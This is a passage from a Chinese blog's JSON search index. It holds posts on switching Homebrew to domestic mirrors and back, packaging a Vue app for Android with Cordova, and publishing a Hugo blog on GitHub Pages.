$ git -C \u0026#34;$(brew --repo)\u0026#34; remote set-url origin https://mirrors.aliyun.com/homebrew/brew.git 修改homebrew-core.git为阿里源 $ git -C \u0026#34;$(brew --repo homebrew/core)\u0026#34; remote set-url origin https://mirrors.aliyun.com/homebrew/homebrew-core.git zsh替换brew bintray镜像 $ echo \u0026#39;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.aliyun.com/homebrew/homebrew-bottles\u0026#39; \u0026gt;\u0026gt; ~/.zshrc $ source ~/.zshrc bash替换 brew bintray镜像 $ echo \u0026#39;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.aliyun.com/homebrew/homebrew-bottles\u0026#39; \u0026gt;\u0026gt; ~/.bash_profile $ source ~/.bash_profile 刷新源 $ brew update 替换为清华源\n替换各个源 $ git -C \u0026#34;$(brew --repo)\u0026#34; remote set-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git $ git -C \u0026#34;$(brew --repo homebrew/core)\u0026#34; remote set-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git $ git -C \u0026#34;$(brew --repo homebrew/cask)\u0026#34; remote set-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-cask.git zsh 替换brew bintray镜像 $ echo \u0026#39;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.tuna.tsinghua.edu.cn/homebrew-bottles\u0026#39; \u0026gt;\u0026gt; ~/.zshrc $ source ~/.zshrc bash 替换brew bintray镜像 $ echo \u0026#39;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.tuna.tsinghua.edu.cn/homebrew-bottles\u0026#39; \u0026gt;\u0026gt; ~/.bash_profile $ source ~/.bash_profile 刷新源 $ brew update 替换为中科大源\n替换各个源 $ git -C \u0026#34;$(brew --repo)\u0026#34; remote set-url origin https://mirrors.ustc.edu.cn/brew.git $ git -C \u0026#34;$(brew --repo homebrew/core)\u0026#34; remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git $ git -C \u0026#34;$(brew --repo homebrew/cask)\u0026#34; remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git zsh 替换 brew bintray 镜像 $ echo \u0026#39;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles\u0026#39; \u0026gt;\u0026gt; ~/.zshrc $ source ~/.zshrc bash 替换 brew bintray 镜像 $ echo \u0026#39;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles\u0026#39; \u0026gt;\u0026gt; ~/.bash_profile $ source ~/.bash_profile 刷新源 $ brew update 重置为官方源\n重置 brew.git 为官方源 $ git -C \u0026#34;$(brew --repo)\u0026#34; remote set-url origin https://github.com/Homebrew/brew.git 重置 homebrew-core.git 为官方源 $ git -C \u0026#34;$(brew --repo homebrew/core)\u0026#34; remote set-url origin https://github.com/Homebrew/homebrew-core.git 重置 homebrew-cask.git 为官方源 $ git -C \u0026#34;$(brew --repo homebrew/cask)\u0026#34; remote set-url origin https://github.com/Homebrew/homebrew-cask zsh 注释掉 HOMEBREW_BOTTLE_DOMAIN 配置 $ vi ~/.zshrc [//] export HOMEBREW_BOTTLE_DOMAIN=xxxxxxxxx bash 注释掉 HOMEBREW_BOTTLE_DOMAIN 配置 $ vi ~/.bash_profile [//] export HOMEBREW_BOTTLE_DOMAIN=xxxxxxxxx 刷新源 $ brew update ","permalink":"https://naiba.fun/post/brew/","summary":"简介 Homebrew 是一款自由及开放源代码的软件包管理系统，用以简化 macOS 和 linux 系统上的软件安装过程。 它拥有安装、卸载、更新、查看、搜索等很多实用的功能，通过简","title":"Brew安装"},{"content":"1.安装 npm cordova npm install -g cordova 全局安装Cordova，可以通过cordova -v 来判断是否成功\n2.创建cordova项目 cordova create androidTest io.cordova.hellocordova CordovaApp androidTest 是创建应用程序的目录名称。 io.cordova.hellocordova 是默认的反向域值。 如果可能，您应该使用您自己的域值。 CordovaApp 是您应用的标题。\ncom.mt.crm.app 名淘教育CRM\n3.添加android平台 cd androidTest cordova platform add android \u0026ndash;save\n4.检查构建app的条件 cordova requirements\n如果都提示 installed 则环境没问题 可以构建App了 5.在模拟器上运行 cordova emulate android\n6.编译vue项目把dist下的拷贝到www目录下\n如果要调试 其他命令及意思 cordova install android //将编译好的应用程序安装到模拟器上。 cordova emulate android //在模拟器上运行（前提是创建好AVD） cordova serve android //在浏览器运行 cordova build android //打包cordova项目到android平台。 cordova run android //通过USB直接安装到真机（该语句已经包括了build命令）\nhttp://cordova.axuer.com/docs/zh-cn/latest/guide/cli/index.html\n","permalink":"https://naiba.fun/post/mcordova_vue_android/","summary":"1.安装 npm cordova npm install -g cordova 全局安装Cordova，可以通过cordova -v 来判断是否成功 2.创建cordova项目 cordova create androidTest io.cordova.hellocordova CordovaApp androidTest 是创建应用程序的目录","title":"cordova把vue项目打包成android"},{"content":"提示：教程默认你已经安装了 git,hugo 安装参考官网：\ngit地址：https://git-scm.com/book/zh/v2/起步-安装-Git-Git\nhugo地址：https://gohugo.io/getting-started/installing/\nmac用户可以使用Homebrew安装\nbrew install git: brew install hugo 下面会分四步介绍 一.配置github 1.注册账号 GitHub地址：https://github.com/\n2.新建博客发布仓库\n这里建议新建2个仓库，和fork一个主题\n一个是用于发布我们博文用的仓库，一个是我们存放源码仓库，fork的主题是方便以后修改样式(可做可不做)\n新建 uunao.github.io\nhttps://github.com/uunao/uunao.github.io.git\nSettings \u0026ndash;\u0026gt;GitHub Pages\n3.新建博客源代码 myblog https://github.com/uunao/myblog.git\n4.fork我们相中的主题到本地，方便以后自己修改 这个我的博客模板，用的飞雪无情的：https://github.com/uunao/maupassant-hugo.git\n也可以到官网或者网上搜索大神们写的主题，保存到自己的github上。\nhugo主题地址：https://themes.gohugo.io/\n二.配置本地 1.新建站点\nhugo new site myblog 2.新建博客目录\ncd myblog 3.初花git\ngit init 4.clone 主题为子模块\ngit submodule add https://github.com/uunao/maupassant-hugo.git themes/maupassant 5.复制主题配置文件\ncp themes/maupassant/exampleSite/config.toml . 6.编辑配置文件\nvim config.toml baseURL = \u0026#34;uunao.github.io\u0026#34; #我们申请的github发布仓库地址 languageCode = \u0026#34;zh-CN\u0026#34; title = \u0026#34;小九的博客\u0026#34; #博客的名字 theme = \u0026#34;maupassant\u0026#34; #主题名称 -无需修改 三.发布 1.预览效果\nhugo server http://localhost:1313\n2.发布博文\n把博客仓库已子模块的形式添加到public下\ngit submodule add https://github.com/uunao/uunao.github.io.git public\n执行 hugo 命令\n默认会在public下生成很多编译好的文件\ngit add * git commit -m \u0026#34;init\u0026#34; git push 3.最后把源码提交到myblog仓库备份\ncd myblog git remote add origin https://github.com/uunao/blog.git git add . git commint -m \u0026#34;init\u0026#34; #init 是每次提交的备注，可自定义 git checkout main git branch --set-upstream-to=origin/main main 四.写文章并发布 1.新增博文 \u0026ndash;默认会生成到content目录下面 (如果报错就cd到上级目录)\nhugo new content/post/my-first-blog.md\n2.编辑文件，把草稿状态改成false。文章才能显示\nvim content/post/my-first-blog.md title: \u0026#34;My First Blog\u0026#34; date: 2021-04-21T14:28:08+08:00 draft: false #需要改成false 3.预览效果 hugo server\n4.生成最终需要发布的页面 hugo\n5.提交到博客仓库\ncd public #进入myblo/public目录下 git add . git commit -m \u0026#34;my first blog\u0026#34; git push 6.提交源码到源码仓库\ncd .. #定位到myblog目录下 git add . git commit -m \u0026#34;my first blog\u0026#34; git push 五.git提交异常 git push 根据提示执行,如果又报如下图错误 git push --set-upstream origin main 先执行 git pull --rebase origin master #远程库中的更新合并到本地库中,然后在把刚刚提交的合并在一起 再执行上面的命令就不报错了 git push --set-upstream origin main #把本地分支合并到main上 ","permalink":"https://naiba.fun/post/my-first-blog/","summary":"提示：教程默认你已经安装了 git,hugo 安装参考官网： git地址：https://git-scm.com/book/zh/v2/起步-安装-Git-Gi","title":"github上创建自己的博客"},{"content":"这家伙很慢什么也没有留下!\n","permalink":"https://naiba.fun/about/","summary":"这家伙很慢什么也没有留下!","title":"关于"}]